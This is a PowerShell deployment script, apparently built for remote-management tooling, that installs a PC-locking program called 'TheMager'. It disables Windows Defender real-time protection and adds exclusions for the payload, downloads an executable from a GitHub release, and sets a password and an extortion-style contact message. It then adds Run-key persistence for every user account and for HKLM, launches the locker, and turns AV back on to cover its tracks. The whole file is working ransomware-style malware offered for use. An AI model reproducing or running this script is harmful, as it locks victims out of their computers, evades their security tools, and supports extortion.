# The Mager - RMM Deploy Script (Fleet Deck / SYSTEM compatible)
# Disables real-time AV FIRST, then downloads and deploys
# Usage: deploy_mager.ps1

$ErrorActionPreference = "Continue"

# --- Config ---
$downloadUrl = "https://github.com/spammerbrain101/pc-locker/releases/download/v1.0/TheMager.exe"
$installDir = "$env:TEMP\TheMager"
$exePath = "$installDir\TheMager.exe"
$password = "Olaoluwa@123"
$message = "contact omarjaziz@proton.me"

# --- Step 1: DISABLE real-time AV FIRST ---
Write-Host "[1/6] Disabling real-time AV protection..."
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -Force 2>$null
    Write-Host "  Real-time monitoring DISABLED"
} catch {
    Write-Host "  WARNING: Could not disable real-time monitoring"
}
Start-Sleep -Seconds 3

# --- Step 2: Add exclusions while AV is off ---
Write-Host "[2/6] Adding Defender exclusions..."
try {
    Add-MpPreference -ExclusionPath $installDir -Force 2>$null
    Add-MpPreference -ExclusionProcess "TheMager.exe" -Force 2>$null
    Add-MpPreference -ExclusionPath $exePath -Force 2>$null
    Write-Host "  Exclusions added (path + process + file)"
} catch {
    Write-Host "  WARNING: Exclusion failed"
}

# --- Step 3: Download ---
Write-Host "[3/6] Downloading TheMager.exe..."
New-Item -ItemType Directory -Path $installDir -Force | Out-Null

# Delete old file if quarantined placeholder exists
if (Test-Path $exePath) { Remove-Item $exePath -Force -ErrorAction SilentlyContinue }

$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri $downloadUrl -OutFile $exePath -UseBasicParsing
$size = (Get-Item $exePath -ErrorAction SilentlyContinue).Length
if ($size -gt 1000) {
    Write-Host "  Downloaded OK ($size bytes)"
} else {
    Write-Host "  ERROR: Download failed or file was quarantined ($size bytes)"
    exit 1
}

# --- Step 4: Set password and message ---
Write-Host "[4/6] Setting password and message..."
$pwFile = "$env:APPDATA\themager_pw.dat"
$cfgFile = "$installDir\lock_config.json"

$sha256 = [System.Security.Cryptography.SHA256]::Create()
$hashBytes = $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($password))
$hashHex = [BitConverter]::ToString($hashBytes).Replace("-", "").ToLower()
Set-Content -Path $pwFile -Value $hashHex -Force
Write-Host "  Password hash saved"

$msgJson = "{`"message`":`"$message`"}"
Set-Content -Path $cfgFile -Value $msgJson -Force
Write-Host "  Message: $message"

# --- Step 5: Add startup for ALL logged-in users ---
Write-Host "[5/6] Adding startup entry..."

$hu = [Microsoft.Win32.Registry]::Users
$subKeys = $hu.GetSubKeyNames()
$foundUsers = 0

foreach ($sid in $subKeys) {
    if ($sid -match "_Classes$") { continue }
    if ($sid -eq "S-1-5-18" -or $sid -eq "S-1-5-19" -or $sid -eq "S-1-5-20") { continue }
    if ($sid -notmatch "^S-1-5-21-") { continue }
    
    $username = $sid
    try {
        $acct = New-Object System.Security.Principal.SecurityIdentifier($sid)
        $username = $acct.Translate([System.Security.Principal.NTAccount]).Value
    } catch { }
    
    try {
        $runPath = "$sid\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        $runKey = $hu.OpenSubKey($runPath, $true)
        if ($runKey) {
            $runKey.SetValue("TheMager", "`"$exePath`"")
            $runKey.Close()
            Write-Host "  Startup OK: $username"
            $foundUsers++
        }
    } catch { }
    
    try {
        $envKey = $hu.OpenSubKey("$sid\Environment", $false)
        if ($envKey) {
            $appData = $envKey.GetValue("APPDATA", $null)
            $envKey.Close()
            if ($appData) {
                $userPwFile = Join-Path $appData "themager_pw.dat"
                if (-not (Test-Path $userPwFile)) {
                    Copy-Item $pwFile $userPwFile -Force 2>$null
                }
            }
        }
    } catch { }
}

try {
    $regKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", $true)
    $regKey.SetValue("TheMager", "`"$exePath`"")
    $regKey.Close()
    Write-Host "  HKLM Run: OK"
    $foundUsers++
} catch { }

# --- Step 6: Launch and lock ---
Write-Host "[6/6] Locking PC..."
Start-Process -FilePath $exePath -ArgumentList "--deploy --password `"$password`" --message `"$message`"" -WindowStyle Normal

Start-Sleep -Seconds 5

# Check it's actually running
$proc = Get-Process TheMager -ErrorAction SilentlyContinue
if ($proc) {
    Write-Host "  TheMager is RUNNING (PID: $($proc.Id))"
} else {
    Write-Host "  WARNING: TheMager not running - AV may have killed it"
}

# Re-enable real-time AV now that file is locked in memory
Write-Host ""
Write-Host "Re-enabling real-time AV..."
try {
    Set-MpPreference -DisableRealtimeMonitoring $false -Force 2>$null
    Write-Host "  Real-time monitoring re-enabled"
} catch {
    Write-Host "  WARNING: Could not re-enable monitoring"
}

Write-Host ""
Write-Host "=== DEPLOY COMPLETE ==="
Write-Host "PC is locked. Unlock with: $password"
